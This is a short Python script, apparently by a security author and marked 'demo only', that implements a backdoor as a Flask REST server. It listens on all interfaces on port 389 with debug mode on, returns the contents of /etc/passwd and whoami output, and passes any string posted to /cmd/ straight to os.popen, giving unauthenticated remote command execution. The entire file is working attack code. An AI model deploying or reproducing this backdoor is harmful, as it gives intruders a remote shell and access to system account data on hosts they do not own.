#!/usr/bin/env python3
#Sample Restful Flask API Server for Backdoor
#DEMO ONLY DO NOT USE FOR ILLEGAL PURPOSES
#Licensed under GPLv2 Dennis Chow 2020-Dec-15
#dchow[AT]xtecsystems.com

#import libraries you may need pip3 install flask-restful
#windows users may also need to do a pip3 install pyopenssl
from flask import Flask, jsonify, request
import os, ssl

#flask app instance 
app = Flask(__name__)

#create restful api endpoints via flask
@app.route('/', methods = ['GET'])
def defaultdir():
    if(request.method == 'GET'):
        data = "foobar world"
        return jsonify({'data': data})

@app.route('/cmd/<int:num>', methods = ['POST'])
def cmd(num):
    if num == 1:
        result = str(os.popen('cat /etc/passwd').read())
        return jsonify({'data': result})
    if num == 2:
        result = str(os.popen('whoami').read())
        return jsonify({'data': result})


@app.route('/cmd/<userinput>', methods = ['POST'])
def shell(userinput):
    result = str(os.popen(userinput).read())
    return jsonify({'data': result})


#driver main function driver
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int("389"), debug = True, ssl_context='adhoc')
    #app.run()
